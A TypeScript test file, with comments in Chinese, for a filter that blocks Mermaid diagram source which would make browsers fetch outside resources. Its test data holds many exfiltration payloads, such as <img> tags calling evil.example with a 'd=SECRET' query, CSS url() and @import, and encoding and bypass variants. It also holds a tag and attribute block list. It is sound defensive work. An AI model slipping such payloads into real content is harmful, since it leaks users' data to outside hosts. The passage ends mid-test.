/**
 * R7-1：mermaid 源码里的 `<img>` / `url()` 等外部资源引用——渲染即向外发请求（追踪像素 / 数据外带）。
 *
 * 上游事实（读 node_modules 源码确认）：`@streamdown/mermaid` 默认 `securityLevel: "strict"`，但 mermaid 11 的 `sanitizeText`
 * 没配 `dompurifyConfig` 时只 `FORBID_TAGS: ["style"]`；themeCSS 不在 `secure` 键里、指令可改；classDef / `@{ img }` 形状数据不经 sanitizeText。
 *
 * 这里钉三层：
 *  1. 预扫纯函数 scanMermaidSource（命中集 / 不误拦集 / 编码与空白变体 / 流式半截）；
 *  2. 插件层 createGatedMermaidPlugin（命中不调底层 mermaid，渲染 / 全屏 / 下载共用的 render 收口）+ 配置层 dompurifyConfig；
 *  3. rehype 层 rehypeGateMermaidBlocks + 真实 Streamdown SSR（命中的块是「源码 + 提示」、没有 mermaid 块；正常图仍是 mermaid 块）+ 接线源码契约。
 * 局限：没有真浏览器——「mermaid 实际渲染时不发请求」只能靠「命中源码根本不会交给 mermaid」来保证，看不到网络面板。
 */
import { readFileSync } from "node:fs";
import path from "node:path";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { mermaid as upstreamMermaid } from "@streamdown/mermaid";
import { Streamdown, defaultRehypePlugins, defaultRemarkPlugins } from "streamdown";
import { describe, expect, it, vi } from "vitest";

import { MarkdownText } from "@/components/markdown-text";
import { ImagePreviewProvider } from "@/components/ui/image-preview";
import { rehypeGateMermaidBlocks } from "@/lib/mermaid-rehype-gate";
import {
  MERMAID_SAFE_CONFIG,
  MermaidBlockedError,
  createGatedMermaidPlugin,
  describeMermaidGateReasons,
  mermaidBlockedNotice,
  scanMermaidSource,
} from "@/lib/mermaid-source-gate";
import { REVISION_REHYPE_PLUGINS } from "@/lib/revision-rehype-plugins";
import { STREAMDOWN_REHYPE_PLUGINS } from "@/lib/streamdown-options";

const ROOT = path.resolve(import.meta.dirname, "..");
const read = (rel: string): string => readFileSync(path.join(ROOT, rel), "utf8");

const blocked = (src: string) => scanMermaidSource(src).blocked;

// ───────── 1. 预扫 ─────────

describe("scanMermaidSource：命中（渲染时会让浏览器自动请求外部资源的构造）", () => {
  const HIT: Array<[string, string]> = [
    // 标签里的 <img>（R7-1 原样例）
    ["节点标签里的 <img src='https://…'>", `flowchart LR\nA["<img src='https://x/p?d=1'>"]`],
    ["大写 <IMG SRC=…>", `flowchart LR\nA[<IMG SRC=https://x/p?d=1>]`],
    ["混合大小写 <ImG>", `flowchart LR\nA["<ImG sRc='/api/x'>"]`],
    ["斜杠代替空白 <img/src=…>", `flowchart LR\nA[<img/src=https://x/p>]`],
    ["换行代替空白 <img\\nsrc=…>", `flowchart LR\nA["<img\nsrc=x>"]`],
    ["< 与标签名之间有空白", `flowchart LR\nA["< img src=x>"]`],
    ["相对地址的 <img src=x>（同源 GET 也是请求）", `flowchart LR\nA["<img src=/api/repo-branches?path=x>"]`],
    ["<image href>（HTML 解析器当 <img>）", `flowchart LR\nA["<image href='https://x/p'>"]`],
    ["svg 内联 <svg><image>", `flowchart LR\nA["<svg><image href='data:,x'/></svg>"]`],
    ["<video poster>", `flowchart LR\nA["<video poster=x></video>"]`],
    ["<audio src>", `flowchart LR\nA["<audio src=x>"]`],
    ["<source srcset>", `flowchart LR\nA["<source srcset=x>"]`],
    // R8-5：光秃秃的 `<picture>`（无属性、立即闭合）按泛型放行，见下方「R8-5 放行集」；容器里的子资源标签带属性照拦
    ["<picture> 里的 <source srcset>", `flowchart LR\nA["<picture><source srcset=x></picture>"]`],
    ["<picture ...> 带属性", `flowchart LR\nA["<picture class=x>"]`],
    ["<link rel=stylesheet>", `flowchart LR\nA["<link rel=stylesheet href=x>"]`],
    ["<style>@import", `flowchart LR\nA["<style>@import 'x'</style>"]`],
    ["<iframe src>", `flowchart LR\nA["<iframe src=x>"]`],
    ["<input type=image src>", `flowchart LR\nA["<input type=image src=x>"]`],
    ["<table background>", `flowchart LR\nA["<table background=x>"]`],
    ["<td background>（标签 + 属性）", `flowchart LR\nA["<span>x</span>"] --> B["<td background=x>"]`],
    // R8-5：光秃秃的 `</img>`（标签名后立即 `>`）放行；闭合标签后面再跟东西照拦
    ["闭合标签形态 </img x>", `flowchart LR\nA["</img x>"]`],
    ["闭合标签形态 </img（流式半截，后面还没闭合）", `flowchart LR\nA["</img`],
    // HTML / mermaid 实体与转义变体
    ["HTML 实体 &lt;img … &gt;", `flowchart LR\nA["&lt;img src='https://x/p'&gt;"]`],
    ["实体 + 引号实体", `flowchart LR\nA["&lt;img src=&quot;x&quot;&gt;"]`],
    ["双重编码 &amp;lt;img", `flowchart LR\nA["&amp;lt;img src=x&amp;gt;"]`],
    ["十进制实体 &#60;img", `flowchart LR\nA["&#60;img src=x&#62;"]`],
    ["十六进制实体 &#x3c;img", `flowchart LR\nA["&#x3c;img src=x&#x3e;"]`],
    ["实体省略分号 &#60img", `flowchart LR\nA["&#60img src=x>"]`],
    ["字母用实体写 &#105;mg", `flowchart LR\nA["<&#105;mg src=x>"]`],
    ["mermaid 实体码 #lt;img", `flowchart LR\nA["#lt;img src=x#gt;"]`],
    ["mermaid 数字实体码 #60;img", `flowchart LR\nA["#60;img src=x#62;"]`],
    ["零宽字符夹在标签名里", `flowchart LR\nA["<im\u200bg src=x>"]`],
    ["NUL / 控制字符夹在标签名里", `flowchart LR\nA["<im\u0000g src=x>"]`],
    // 只靠「抹掉零宽 / 控制字符」才能命中的形态（保守：浏览器多半不会这样解析，但宁可统一抹掉再比；
    // 上面那两条带 src= 的会被属性规则兜住，测不到抹除本身）
    ["零宽字符夹在 url( 里", `flowchart LR\nclassDef x background:ur\u200bl(x)`],
    ["NUL 夹在 url( 里", `flowchart LR\nclassDef x background:ur\u0000l(x)`],
    ["方向控制字符夹在 themeCSS 里", `%%{init: {"theme\u202eCSS": "x"}}%%\nflowchart LR\nA-->B`],
    // 无属性的 `<img>` 现在放行（R8-5），所以这里用「标签名后跟了东西」的形态——不抹零宽字符的话 `<im g x>` 不会命中
    ["零宽字符夹在标签名里（标签名后跟了非属性文字）", `flowchart LR\nA["<im\u200bg x>"]`],
    ["零宽字符夹在标签名里（流式半截）", `flowchart LR\nA["<im\u200bg`],
    // CSS
    ["classDef background-image:url(https://…)", `flowchart LR\nA-->B\nclassDef x background-image:url(https://x/p?d=1)\nclass A x`],
    ["url() 无协议（相对 / 同源）", `flowchart LR\nclassDef x fill:#fff,background:url(/api/x)`],
    ["大写 URL(", `flowchart LR\nclassDef x background:URL(x)`],
    // R8-5：`url (x)`（带空白）不再算——CSS 里它不是函数；紧贴括号的 `url(` 仍拦
    ["url( 紧贴括号", `flowchart LR\nclassDef x background:url(x)`],
    ["CSS 转义 u\\72l(", `flowchart LR\nclassDef x background:u\\72l(x)`],
    ["CSS 转义（带尾随空白的十六进制）u\\000072l(", `flowchart LR\nclassDef x background:u\\000072 l(x)`],
    ["style 属性里的 url()", `flowchart LR\nA["<span style='background:url(x)'>t</span>"]`],
    ["image-set()", `flowchart LR\nclassDef x background:image-set("x" 1x)`],
    ["-webkit-image-set()", `flowchart LR\nclassDef x background:-webkit-image-set("x" 1x)`],
    ["cross-fade()", `flowchart LR\nclassDef x background:cross-fade(x, y, 50%)`],
    ["@import", `flowchart LR\nclassDef x @import "x.css"`],
    ["实体写的 url&lpar;", `flowchart LR\nclassDef x background:url&lpar;x)`],
    // themeCSS / 初始化指令
    ["themeCSS 指令带 @import url(https://…)", `%%{init: {"themeCSS": "@import url(https://x/p);"}}%%\nflowchart LR\nA-->B`],
    ["themeCSS（即使没有 url）", `%%{init: {"themeCSS": ".node{fill:red}"}}%%\nflowchart LR\nA-->B`],
    ["frontmatter 里的 themeCSS（大小写）", `---\nconfig:\n  THEMECSS: ".x{}"\n---\nflowchart LR\nA-->B`],
    // mermaid 自己的图片形状
    ["@{ img: \"https://…\" } 形状", `flowchart LR\nA@{ img: "https://x/p?d=1", label: "x", pos: "t", w: 60, h: 60 }`],
    ["@{ img: 相对地址 }", `flowchart LR\nA@{ img: "/api/x", label: "x" }`],
    ["@{ \"img\": … }（键带引号）", `flowchart LR\nA@{ "img": "x.png" }`],
    ["@{ img : … }（冒号前有空白）", `flowchart LR\nA@{ img : x.png }`],
    // 协议 / host
    ["节点文字里的完整 https:// 地址", `flowchart LR\nA["https://example.com/doc"]`],
    ["HTTP:// 大写", `flowchart LR\nA["HTTP://EXAMPLE.COM"]`],
    ["ftp:// / wss://", `flowchart LR\nA["ftp://x.example/a"] --> B["wss://y.example"]`],
    ["scheme 里夹 LF（浏览器会丢掉）", `flowchart LR\nA["ht\ntps://x.example"]`],
    ["scheme 里夹 tab", `flowchart LR\nA["ht\ttps://x.example"]`],
    ["实体写的 https&colon;&sol;&sol;", `flowchart LR\nA["https&colon;&sol;&sol;x.example"]`],
    ["协议相对 //host.tld/x", `flowchart LR\nA["//cdn.example.com/x.png"]`],
    ["协议相对 + 实体 &sol;&sol;", `flowchart LR\nA["&sol;&sol;cdn.example.com/x"]`],
    ["单斜杠 scheme（浏览器当 https://）https:/host", `flowchart LR\nA["https:/x.example"]`],
  ];

  it.each(HIT)("%s → blocked", (_label, src) => {
    const r = scanMermaidSource(src);
    expect(r.blocked, src).toBe(true);
    expect(r.blocked && r.reasons.length).toBeGreaterThan(0);
  });

  it("非字符串输入（fail-closed）", () => {
    for (const v of [undefined, null, 123, {}, ["x"]]) {
      expect(scanMermaidSource(v)).toEqual({ blocked: true, reasons: ["invalid-input"] });
    }
  });

  it("命中原因可读：reasons 去重、中文描述、提示文案带原因", () => {
    const r = scanMermaidSource(`flowchart LR\nA["<img src='https://x/p'>"]\nclassDef x background:url(https://x/q)`);
    expect(r.blocked).toBe(true);
    if (!r.blocked) return;
    expect(r.reasons).toEqual(expect.arrayContaining(["html-tag", "url-attribute", "css-url", "remote-url"]));
    const desc = describeMermaidGateReasons([...r.reasons, ...r.reasons]);
    expect(desc).toContain("HTML 图片");
    expect(desc.split("、").length).toBe(new Set(r.reasons).size); // 重复的原因只列一次
    expect(mermaidBlockedNotice(r.reasons)).toContain("只显示源码");
  });
});

describe("scanMermaidSource：正常图不误拦", () => {
  const OK: Array<[string, string]> = [
    ["最小流程图 A --> B", "graph TD\n  A --> B"],
    ["带中文与分支标签", "flowchart LR\n  A[开始] -->|是| B[结束]\n  A -->|否| C{再想想}"],
    ["时序图", "sequenceDiagram\n  Alice->>Bob: Hello\n  Bob-->>Alice: Hi"],
    ["双向箭头 / 类图继承", "flowchart LR\n  A<-->B\nclassDiagram\n  Animal <|-- Dog"],
    ["类图注解 <<interface>>", "classDiagram\n  class Shape\n  <<interface>> Shape\n  class Svc {\n    <<Service>>\n  }"],
    ["类图泛型 ~T~", "classDiagram\n  class List~T~ {\n    +add(T item)\n  }"],
    ["标签里的 <br/> 与 <b>", `flowchart LR\n  A["第一行<br/>第二行"] --> B["<b>粗体</b> 与 <i>斜体</i>"]`],
    ["泛型文字 Map<String, Object>", `flowchart LR\n  A["Map<String, Object>"]`],
    ["泛型文字 List<Object>（Object 光秃秃不算带属性标签）", `flowchart LR\n  A["List<Object>"]`],
    ["比较符 a < b", `flowchart LR\n  A["if a < b then"]`],
    ["普通文字里的 https 字样（不带 ://）", `flowchart LR\n  A["https 协议握手"] --> B["TLS / HTTPS"]`],
    ["函数调用式的 getUrl()", `flowchart LR\n  A["getUrl()"] --> B["fetchUrl(x)"]`],
    ["curl (x) 里的 url( 子串", `flowchart LR\n  A["call curl (x)"]`],
    ["classDef 颜色 #f9f / #333", "flowchart LR\n  A-->B\n  classDef x fill:#f9f,stroke:#333,stroke-width:4px,color:#fff;\n  class A x"],
    ["style / linkStyle", "flowchart LR\n  A-->B\n  style A fill:#fff,stroke:#000\n  linkStyle 0 stroke:#f00"],
    ["普通初始化指令（主题）", `%%{init: {"theme": "dark", "flowchart": {"curve": "basis"}}}%%\nflowchart LR\n  A-->B`],
    ["span 的 style（颜色，不含 url）", `flowchart LR\n  A["<span style='color:red'>x</span>"]`],
    ["gantt", "gantt\n  dateFormat YYYY-MM-DD\n  section A\n  任务 :a1, 2024-01-01, 30d"],
    ["pie / journey / timeline", `pie title 占比\n  "A" : 40\n  "B" : 60\njourney\n  title 一天\n  section 早\n    起床: 5: 我`],
    ["erDiagram 里的 url 字段名（无括号）", "erDiagram\n  PAGE {\n    string url PK\n  }"],
    ["icon 形状（无 img）", `flowchart LR\n  A@{ icon: "fa:user", label: "u" }`],
    ["两个斜杠但不是 host（a//b）", `flowchart LR\n  A["a//b"]`],
    ["注释 %%", "flowchart LR\n  %% 这是注释\n  A-->B"],
    ["空串", ""],
  ];

  it.each(OK)("%s → 放行", (_label, src) => {
    expect(scanMermaidSource(src), src).toEqual({ blocked: false });
  });

  it("【取舍已钉住】保守原则下的已知误拦：节点文字里写完整 URL / 泛型里危险标签名后面还跟了东西 / 以 img: 开头的文字", () => {
    // 这些都会让正常图退回「显示源码 + 提示」——用户仍能看到全部内容，只是没有渲染成图。换来的是不漏放。
    expect(blocked(`flowchart LR\n  A["详见 https://example.com/doc"]`)).toBe(true);
    expect(blocked(`flowchart LR\n  A["Map<Image, String>"]`)).toBe(true); // R8-5：光秃秃的 `<Image>` 已放行，后面还有逗号 / 空白的仍拦
    expect(blocked(`flowchart LR\n  A["img: 头像"]`)).toBe(true);
    expect(blocked(`flowchart LR\n  A["<table class=x>"]`)).toBe(true);
    // 对照：同一类文字去掉危险形态就放行
    expect(blocked(`flowchart LR\n  A["详见 example.com 文档"]`)).toBe(false);
    expect(blocked(`flowchart LR\n  A["Array of images"]`)).toBe(false);
    expect(blocked(`flowchart LR\n  A["image 头像"]`)).toBe(false);
  });

  it("性能：长文本 / 大量 `<a` 起点不会卡（线性扫描，没有回溯爆炸）", () => {
    const evil = `${"<a ".repeat(20000)}"${"x".repeat(20000)}`;
    const t0 = Date.now();
    scanMermaidSource(evil);
    scanMermaidSource("A-->B\n".repeat(20000));
    scanMermaidSource(`"${"&amp;".repeat(20000)}`);
    expect(Date.now() - t0).toBeLessThan(2000);
  });

  it("padding 绕过：危险属性前垫很长的无关属性仍命中（没有按标签解析属性所属）", () => {
    const pad = `title="${"x".repeat(5000)}"`;
    expect(blocked(`flowchart LR\n  A["<span ${pad} src=https://x/p>"]`)).toBe(true);
    expect(blocked(`flowchart LR\n  A["<td ${pad} background=x>"]`)).toBe(true);
    expect(blocked(`flowchart LR\n  A["<div ${pad} src=x>"]`)).toBe(true);
  });
});

describe("流式：半截源码也先过预扫", () => {
  const FULL = `flowchart LR\n  A["<img src='https://x/p?d=SECRET'>"] --> B`;

  it("一旦危险片段写完整（<img + 空白已出现），之后的每个前缀都命中——不会出现「后来才发现」的反复", () => {
    const from = FULL.indexOf("<img ") + "<img ".length; // 标签名与分隔符都已到
    for (let k = from; k <= FULL.length; k += 1) {
      expect(blocked(FULL.slice(0, k)), `prefix[${k}]=${JSON.stringify(FULL.slice(0, k))}`).toBe(true);
    }
  });

  it("危险片段还没写出来的前缀放行（此时 mermaid 拿到的文本里也没有它，不可能触发请求）", () => {
    const before = FULL.slice(0, FULL.indexOf("<img"));
    expect(blocked(before)).toBe(false);
    expect(blocked(`${before}<`)).toBe(false);
    expect(blocked(`${before}<im`)).toBe(false);
  });

  it("标签名刚写完（`<img` 后面还没东西）就已命中：光秃秃的 <img 也拦（保守）", () => {
    expect(blocked(`flowchart LR\n  A["<img`)).toBe(true);
  });

  it("classDef url( 的前缀：`url(` 写出的那一刻起命中，之后一直命中", () => {
    const full = "flowchart LR\n  A-->B\n  classDef x background-image:url(https://x/p?d=1)";
    const from = full.indexOf("url(") + "url(".length;
    for (let k = from; k <= full.length; k += 1) expect(blocked(full.slice(0, k)), `k=${k}`).toBe(true);
    expect(blocked(full.slice(0, full.indexOf("url(") + 3))).toBe(false); // `url` 还没有括号
  });

  it("themeCSS / img: 的前缀同理", () => {
    const t = `%%{init: {"themeCSS": "x"}}%%`;
    expect(blocked(t.slice(0, t.indexOf("themeCSS") + "themeCSS".length))).toBe(true);
    const s = `flowchart LR\n  A@{ img: "x" }`;
    expect(blocked(s.slice(0, s.indexOf("img:") + 4))).toBe(true);
    expect(blocked(s.slice(0, s.indexOf("img:") + 3))).toBe(false);
  });
});

// ───────── 2. 插件层 / 配置层 ─────────

const makeFakeBase = () => {
  const render = vi.fn(async (_id: string, source: string) => ({ svg: `<svg data-src="${source.length}"></svg>` }));
  const initialize = vi.fn();
  const getMermaid = vi.fn((config?: unknown) => {
    if (config) initialize(config);
    return { initialize, render };
  });
  return {
    base: { name: "mermaid" as const, type: "diagram" as const, language: "mermaid", getMermaid },
    render,
    initialize,
    getMermaid,
  };
};

describe("createGatedMermaidPlugin：render 之前先预扫，命中不调用底层 mermaid", () => {
  it("命中 → 抛 MermaidBlockedError（message 是给人看的提示），底层 render 一次都没被调用", async () => {
    const { base, render } = makeFakeBase();
    const plugin = createGatedMermaidPlugin(base);
    const inst = plugin.getMermaid();
    const src = `flowchart LR\nA["<img src='https://x/p?d=1'>"]`;
    const err = await inst.render("m1", src).catch((e: unknown) => e);
    expect(err).toBeInstanceOf(MermaidBlockedError);
    expect((err as MermaidBlockedError).reasons).toContain("html-tag");
    expect((err as Error).message).toContain("只显示源码");
    expect(render).not.toHaveBeenCalled();
  });

  it("同一个实例上：先放行、再命中、再放行——逐次判定，互不影响", async () => {
    const { base, render } = makeFakeBase();
    const inst = createGatedMermaidPlugin(base).getMermaid();
    await expect(inst.render("a", "graph TD\nA-->B")).resolves.toMatchObject({ svg: expect.any(String) });
    await expect(inst.render("b", "graph TD\nclassDef x background:url(x)")).rejects.toBeInstanceOf(MermaidBlockedError);
    await expect(inst.render("c", "graph TD\nC-->D")).resolves.toMatchObject({ svg: expect.any(String) });
    expect(render.mock.calls.map((c) => c[0])).toEqual(["a", "c"]);
  });

  it("放行时原样转发 id / source；initialize 与 config 原样转发；name / type / language 保留", async () => {
    const { base, render, initialize, getMermaid } = makeFakeBase();
    const plugin = createGatedMermaidPlugin(base);
    expect(plugin.name).toBe("mermaid");
    expect(plugin.type).toBe("diagram");
    expect(plugin.language).toBe("mermaid");
    const cfg = { theme: "dark" } as const;
    const inst = plugin.getMermaid(cfg);
    expect(getMermaid).toHaveBeenCalledWith(cfg);
    inst.initialize({ theme: "neutral" });
    expect(initialize).toHaveBeenLastCalledWith({ theme: "neutral" });
    await inst.render("id-1", "graph TD\nA-->B");
    expect(render).toHaveBeenCalledWith("id-1", "graph TD\nA-->B");
  });

  it("下载 SVG / PNG、全屏走的也是 getMermaid().render：每次 getMermaid 拿到的新实例同样带闸", async () => {
    const { base, render } = makeFakeBase();
    const plugin = createGatedMermaidPlugin(base);
    for (let i = 0; i < 3; i += 1) {
      await expect(plugin.getMermaid().render(`d${i}`, `A["<IMG SRC=x>"]`)).rejects.toBeInstanceOf(MermaidBlockedError);
    }
    expect(render).not.toHaveBeenCalled();
  });
});

describe("MERMAID_SAFE_CONFIG：dompurifyConfig 第二道（只覆盖经 sanitizeText 的文本，纵深防御）", () => {
  const cfg = MERMAID_SAFE_CONFIG.dompurifyConfig as { FORBID_TAGS?: string[]; FORBID_ATTR?: string[] };

  it("securityLevel 钉 strict；禁图片 / 媒体 / 链接样式标签与 src / srcset / poster / background 属性", () => {
    expect(MERMAID_SAFE_CONFIG.securityLevel).toBe("strict");
    for (const t of ["img", "image", "video", "audio", "source", "picture", "link", "style", "feimage", "iframe", "embed", "object"]) {
      expect(cfg.FORBID_TAGS, t).toContain(t);
    }
    for (const a of ["src", "srcset", "poster", "background"]) {
      expect(cfg.FORBID_ATTR, a).toContain(a);
    }
  });

  it("【取舍已钉住】不禁 svg / use / math 标签与 style / xlink:href / href 属性：mermaid 的图标（getIconSVG）与 KaTeX 公式输出也走 sanitizeText，禁了会渲染坏", () => {
    for (const t of ["svg", "use", "math", "path", "g", "span", "a"]) expect(cfg.FORBID_TAGS, t).not.toContain(t);
    for (const a of ["style", "xlink:href", "href", "class", "d", "viewbox"]) expect(cfg.FORBID_ATTR, a).not.toContain(a);
  });

  it("补位：第二层放行的 svg / use，由预扫兜住（带 <svg / <use / https:// 的整图不会交给 mermaid）", () => {
    expect(blocked(`flowchart LR\nA["<svg><use href='https://x/y.svg#a'/></svg>"]`)).toBe(true);
    expect(blocked(`flowchart LR\nA["<svg><use href='#a'/></svg>"]`)).toBe(true);
    expect(blocked(`flowchart LR\nA["<math><mi>x</mi></math>"]`)).toBe(true); // 保守：行内 MathML 也整图退回源码
    // KaTeX 公式语法本身（$$…$$）是 mermaid 自己渲染的，不含这些标签，不受影响
    expect(blocked("flowchart LR\n  A[\"$$E=mc^2$$\"]")).toBe(false);
  });
});

// ───────── 3. rehype 层 + 真实 Streamdown SSR ─────────

type Hast = { type: string; tagName?: string; value?: string; properties?: Record<string, unknown>; children?: Hast[] };

const codeBlock = (lang: string, text: string): Hast => ({
  type: "element",
  tagName: "pre",
  properties: {},
  children: [
    {
      type: "element",
      tagName: "code",
      properties: { className: [`language-${lang}`] },
      children: [{ type: "text", value: text }],
    },
  ],
});

const runRehype = (children: Hast[]): Hast => {
  const tree: Hast = { type: "root", children };
  (rehypeGateMermaidBlocks as unknown as () => (t: unknown) => void)()(tree);
  return tree;
};

describe("rehypeGateMermaidBlocks（AST 层）", () => {
  it("命中的 mermaid 块：class 改成 language-text，前面插入一条提示 <p>", () => {
    const tree = runRehype([codeBlock("mermaid", `flowchart LR\nA["<img src=x>"]`)]);
    expect(tree.children).toHaveLength(2);
    const [notice, pre] = tree.children!;
    expect(notice.tagName).toBe("p");
    expect(notice.properties?.dataMermaidGated).toBe("true");
    expect(notice.children?.[0]?.value).toContain("只显示源码");
    expect(pre.children?.[0]?.properties?.className).toEqual(["language-text"]);
    expect(pre.children?.[0]?.children?.[0]?.value).toContain("<img src=x>"); // 源码原样保留
  });

  it("正常 mermaid 块不动；非 mermaid 的代码块（含同样危险的文字）也不动", () => {
    const ok = codeBlock("mermaid", "graph TD\nA-->B");
    const js = codeBlock("html", `<img src="https://x/p">`);
    const tree = runRehype([ok, js]);
    expect(tree.children).toHaveLength(2);
    expect(tree.children![0]!.children![0]!.properties?.className).toEqual(["language-mermaid"]);
    expect(tree.children![1]!.children![0]!.properties?.className).toEqual(["language-html"]);
  });

  it("嵌套在列表 / 引用里的 mermaid 块也会被扫到；language-Mermaid 大小写也拦", () => {
    const tree = runRehype([
      { type: "element", tagName: "blockquote", properties: {}, children: [codeBlock("Mermaid", `A["<IMG SRC=x>"]`)] },
    ]);
    const inner = tree.children![0]!.children!;
    expect(inner).toHaveLength(2);
    expect(inner[0]!.properties?.dataMermaidGated).toBe("true");
    expect(inner[1]!.children![0]!.properties?.className).toEqual(["language-text"]);
  });

  it("多个 mermaid 块：只拦命中的那个", () => {
    const tree = runRehype([
      codeBlock("mermaid", "graph TD\nA-->B"),
      codeBlock("mermaid", `graph TD\nclassDef x background:url(x)`),
      codeBlock("mermaid", "graph TD\nC-->D"),
    ]);
    const classes = tree.children!
      .filter((n) => n.tagName === "pre")
      .map((n) => (n.children![0]!.properties!.className as string[])[0]);
    expect(classes).toEqual(["language-mermaid", "language-text", "language-mermaid"]);
    expect(tree.children!.filter((n) => n.properties?.dataMermaidGated === "true")).toHaveLength(1);
  });
});

describe("rehype 表接线（三处 Streamdown 入口共用）", () => {
  it("STREAMDOWN_REHYPE_PLUGINS 含 rehypeGateMermaidBlocks，且位于 sanitize 之后、harden 之前", () => {
    const list = STREAMDOWN_REHYPE_PLUGINS as unknown[];
    const i = list.indexOf(rehypeGateMermaidBlocks);
    expect(i).toBeGreaterThan(-1);
    expect(i).toBeGreaterThan(list.indexOf(defaultRehypePlugins.sanitize));
    expect(i).toBeLessThan(list.indexOf(defaultRehypePlugins.harden));
  });

  it("修订视图的表（在共用表上 map 出来的）自动继承", () => {
    expect((REVISION_REHYPE_PLUGINS as unknown[]).includes(rehypeGateMermaidBlocks)).toBe(true);
  });
});

const renderMT = (md: string, opts: { streaming?: boolean } = {}): string =>
  renderToStaticMarkup(
    createElement(ImagePreviewProvider, null, createElement(MarkdownText, { text: md, ...opts })),
  );

const renderWith = (md: string, rehypePlugins: unknown, extra: Record<string, unknown> = {}): string =>
  renderToStaticMarkup(
    createElement(
      Streamdown,
      {
        mode: "static",
        rehypePlugins,
        remarkPlugins: [...Object.values(defaultRemarkPlugins)],
        ...extra,
      } as never,
      md,
    ),
  );

/**
 * 命中后的 SSR 形态 = 「提示 + language-text 的普通代码块（源码可见）」；
 * 没命中的 mermaid 块在 SSR 里只是 Suspense 骨架（Mermaid 组件是懒加载、effect 里才 render，renderToStaticMarkup 看不到图本身），
 * 所以用「有没有代码块 + 提示」来区分两条路，而不是找 mermaid 块容器。
 */
const isSourceView = (html: string): boolean =>
  html.includes('data-mermaid-gated="true"') &&
  html.includes('data-streamdown="code-block"') &&
  html.includes('data-language="text"');
/** 交给了 mermaid 渲染器：懒加载骨架（首次）或 Mermaid 组件的占位（懒加载模块已缓存后），都不是代码块、也没有提示 */
const isMermaidSkeleton = (html: string): boolean =>
  !html.includes('data-streamdown="code-block"') &&
  !html.includes("data-mermaid-gated") &&
  (html.includes("animate-spin") || html.includes("min-h-[200px]") || html.includes('data-streamdown="mermaid-block"'));

const MALICIOUS = [
  "前言",
  "",
  "```mermaid",
  "flowchart LR",
  `A["<img src='https://evil.example/p?d=SECRET'>"]`,
  "```",
].join("\n");
const BENIGN = ["前言", "", "```mermaid", "graph TD", "  A --> B", "```"].join("\n");

describe("真实 MarkdownText SSR：命中的 mermaid 块不进 mermaid 渲染器", () => {
  it("命中：是「提示 + 源码代码块」；没有 <img> 元素；源码（转义后）可见", () => {
    const html = renderMT(MALICIOUS);
    expect(isSourceView(html)).toBe(true);
    expect(html).not.toMatch(/<img\b/i);
    expect(html).toContain("只显示源码");
    expect(html).toContain("flowchart LR"); // 源码可读
    expect(html).toContain("&lt;img src="); // 以转义文本出现，不是元素
  });

  it("命中的块没有 language-mermaid（不会走 mermaid 渲染器），而是 language-text 的普通代码块", () => {
    const html = renderMT(MALICIOUS);
    expect(html).not.toMatch(/language-mermaid/);
    expect(html).toContain('data-language="text"');
  });

  it("正常图：仍交给 mermaid 渲染器（SSR 里是它的懒加载骨架）、没有提示、没有退回源码", () => {
    const html = renderMT(BENIGN);
    expect(isMermaidSkeleton(html)).toBe(true);
    expect(html).not.toContain("只显示源码");
    expect(html).not.toContain("A --");
  });

  it("流式半截：围栏没闭合 / 标签没闭合的半截源码同样不进 mermaid 渲染器", () => {
    const partials = [
      "```mermaid\nflowchart LR\nA[\"<img src='https://evil.example/p?d=SECRET",
      "```mermaid\nflowchart LR\nA[\"<img src=",
      "```mermaid\nflowchart LR\nA-->B\nclassDef x background-image:url(https://evil.example/p?d=SECRET",
      "```mermaid\nflowchart LR\nA[\"&lt;img src='https://evil.example/p",
    ];
    for (const md of partials) {
      for (const streaming of [true, false]) {
        const html = renderMT(md, { streaming });
        expect(isSourceView(html), `${streaming ? "流式" : "定稿"}: ${md}`).toBe(true);
        expect(html, md).not.toMatch(/<img\b/i);
      }
    }
  });

  it("流式 → 逐字符喂：命中之前的前缀是 mermaid 块、命中之后全部是源码块，从不反复", () => {
    const md = MALICIOUS;
    const hitAt = md.indexOf("<img ") + "<img ".length;
    for (let k = hitAt; k <= md.length; k += 7) {
      const html = renderMT(md.slice(0, k), { streaming: true });
      expect(isSourceView(html), `k=${k}`).toBe(true);
      expect(html, `k=${k}`).not.toMatch(/<img\b/i);
    }
    // 命中之前：围栏刚开、源码还没出现危险片段 → 仍按 mermaid 块处理（骨架）
    const before = md.slice(0, md.indexOf("<img"));
    expect(isMermaidSkeleton(renderMT(before, { streaming: true }))).toBe(true);
  });

  it("产物栏 / 修订视图那条路（Streamdown 直接配共用 rehype 表）同样命中即退回源码", () => {
    for (const table of [STREAMDOWN_REHYPE_PLUGINS, REVISION_REHYPE_PLUGINS]) {
      // 故意挂上**未包闸的上游 mermaid 插件**：证明 rehype 层自己就能把命中的块退回源码（不依赖插件层）
      const plugins = { plugins: { mermaid: upstreamMermaid } };
      const html = renderWith(MALICIOUS, table, plugins);
      expect(isSourceView(html)).toBe(true);
      expect(html).not.toMatch(/<img\b/i);
      expect(html).toContain("只显示源码");
      // 对照：正常图走同一张表仍是 mermaid 骨架
      expect(isMermaidSkeleton(renderWith(BENIGN, table, plugins))).toBe(true);
    }
  });

  it("其它语言的代码块里写 <img> 不受影响（只拦 mermaid）", () => {
    const html = renderMT("```html\n<img src=\"https://evil.example/p\">\n```");
    expect(html).not.toContain("data-mermaid-gated");
    expect(html).not.toMatch(/<img\b/i); // 代码块里是转义文本，不是元素
  });
});

describe("markdown-text.tsx 接线契约（源码）", () => {
  const src = read("src/components/markdown-text.tsx");

  it("不再直接用上游 `mermaid` 单例：插件 = createGatedMermaidPlugin(createMermaidPlugin({ config: MERMAID_SAFE_CONFIG }))", () => {
    expect(src).not.toMatch(/import\s*\{[^}]*\bmermaid\b[^}]*\}\s*from\s*"@streamdown\/mermaid"/);
    expect(src).toMatch(/createGatedMermaidPlugin\(\s*createMermaidPlugin\(\{\s*config:\s*MERMAID_SAFE_CONFIG\s*\}\)/);
    expect(src).toMatch(/STREAMDOWN_PLUGINS\s*=\s*\{\s*code,\s*mermaid:\s*GATED_MERMAID,/);
  });

  it("流式实例的插件表是在 STREAMDOWN_PLUGINS 上展开的（继承带闸的 mermaid）", () => {
    expect(src).toMatch(/STREAMDOWN_STREAMING_PLUGINS\s*=\s*\{\s*\.\.\.STREAMDOWN_PLUGINS,/);
  });

  it("共用 rehype 表由 streamdown-options 提供且含 mermaid 闸；产物栏 / 修订视图用的是共用表（继承 rehype 层）", () => {
